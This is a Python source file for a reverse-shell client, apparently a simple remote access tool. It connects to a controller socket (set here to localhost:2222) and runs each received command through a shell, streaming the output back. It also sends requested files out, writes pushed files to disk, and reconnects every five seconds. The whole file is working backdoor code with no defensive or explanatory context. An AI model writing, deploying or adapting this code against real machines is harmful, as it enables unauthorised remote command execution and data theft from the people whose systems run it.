import socket
import time
import subprocess
from threading import Thread
import os


HOST = 'localhost'
PORT = 2222



def upload(server):
    filename = server.recv(1024*1025).decode()
    if os.path.exists(filename):
        filesize = os.path.getsize(filename)
        server.send(str(filesize).encode())
        with open(filename , 'rb') as file:
            while True:
                chunk = file.read(1024*1024*10)

                if not chunk:
                    break
                else:
                    server.send(chunk)
        server.send(b'loop breaked')
        print('loop breaked')
def download(server):
    path = server.recv(1024*1024*5).decode()
    with open(path , 'wb') as f:
        while True:
            chunk = server.recv(1024*1024*50)

            if  chunk ==b'upload' or not chunk:
                break
            else:
                f.write(chunk)
                server.send(b'received')




def sendRes(server , prompt ):

    g = 0
    while True:
        res = prompt.stdout.readline()
        if not res:
            g +=1
        else:
            server.send(res if isinstance(res , bytes) else res.encode())
        if g>15:
            server.send(b'code to terminate')
            break
    print('loop breaked')


def handleRecv(server):
    while True:
        cmd = server.recv(1024*1024*5).decode()

        if cmd.lower().startswith('cd') and not cmd.lower() == 'cd':
            try:
                os.chdir(cmd.split(' ')[1])
            except:
                server.send(b'cannot change dir!!')
        elif cmd.lower()=='upload':
            download(server)
        elif cmd.lower() == 'download':
            r = upload(server)
        else:
            prompt  = subprocess.Popen(cmd , shell = True , stdout = subprocess.PIPE , stderr = subprocess.PIPE)
            t = Thread(target = lambda : sendRes(server , prompt ))
            t.daemon = True
            t.start()

def main():
    s = socket.socket()
    s.connect((HOST , PORT))
    handleRecv(s)



while True:
    try:
        main()
    except Exception as e:
        print(e)
    time.sleep(5)